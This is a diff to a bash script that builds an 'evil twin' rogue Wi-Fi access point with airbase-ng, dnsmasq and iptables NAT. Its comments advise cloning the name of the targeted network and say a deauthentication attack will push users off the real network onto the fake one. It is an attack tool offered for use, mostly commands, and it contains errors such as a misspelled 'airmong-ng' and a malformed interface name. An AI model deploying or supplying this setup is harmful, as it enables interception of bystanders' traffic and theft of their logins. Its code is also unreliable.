@@ -2,19 +2,28 @@
 
 # this script sets up the evil twin
 
-# update the device
-sudo apt-get update
+UPDATE=true
+BRIDGE=wlan0 		# connected to internet, could be eth0 too
+WLAN=wlan1			# monitor mode wirless adapter
+ESSID=TEST
+CHANNEL=11
 
-# install dnsmasq
-sudo apt-get install dnsmasq
+if [ "$UPDATE" = true ]; then
+	# update the device
+	sudo apt-get update
 
-# Update Device
-sudo apt-get update
-	
-# Install dnsmasq
-apt-get install dnsmasq
+	# install dnsmasq
+	sudo apt-get install dnsmasq
+
+	# Update Device
+	sudo apt-get update
+		
+	# Install dnsmasq
+	apt-get install dnsmasq
+fi
 	
 # Configure dns masq
+echo -e "\nConfiguring dnsmasq"
 mkdir /root/Desktop/eviltwin
 touch /root/Desktop/eviltwin/dnsmasq.conf
 echo "interface=at0
@@ -28,7 +37,9 @@ listen-address=127.0.0.1" >> /root/Desktop/eviltwin/dnsmasq.conf
 
 
 # Update NetworkManager.conf, Add these lines to the end: 
-echo "[keyfile]
+echo -e "Configuring NetworkManager"
+echo "
+[keyfile]
 unmanaged-devices:mac=AA:BB:CC:DD:EE:FF, A2:B2:C2:D2:E2:F2" >> /etc/NetworkManager/NetworkManager.conf
 
 
@@ -37,13 +48,20 @@ unmanaged-devices:mac=AA:BB:CC:DD:EE:FF, A2:B2:C2:D2:E2:F2" >> /etc/NetworkManag
 # 	It should be named wlan0 or wlan1
 
 # Enable the wireless adapter
-ifconfig wlan1 up
+echo -e "Enabled $WLAN"
+ifconfig $WLAN up
+
+# create the monitor network interface
+echo -e "Creating $WLAN monitor interface"
+airmong-ng start $WLAN
 
 # start up the evil twin AP (access point)
 # 	Give the evil twin the same name as the network you are attacking for best results
-airbase-ng -e "TEST" -c 11 wlan1mon
+echo -e "starting evil twin"
+airbase-ng -e $ESSID -c $CHANNEL "{$WLAN}mon"
 
-# 10. Give the evil twin can access the internet.
+# Give the evil twin can access the internet.
+echo -e "Configuring at0 interface"
 ifconfig at0
 
 # give at0 an ip address: 
@@ -57,15 +75,17 @@ ifconfig at0 10.0.0.1 up
 
 # Otherwise bridged Wireless Adapter
 iptables --flush
-iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE
+iptables --table nat --append POSTROUTING --out-interface $BRIDGE -j MASQUERADE
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 
 # enable port forwarding: 
+echo -e "Enabling port forwarding"
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 # 13. evil twin is now setup, now need to allocate ip addresses to clients
 dnsmasq -C /root/Desktop/eviltwin/dnsmasq.conf -d
 
+echo -e "Success ${ESSID} is up"
 # 14. NOW startup the webserver, see the tutorial for more info
 
 # 15. Finally run the deauthorization attack and kick people off the legit network onto ours
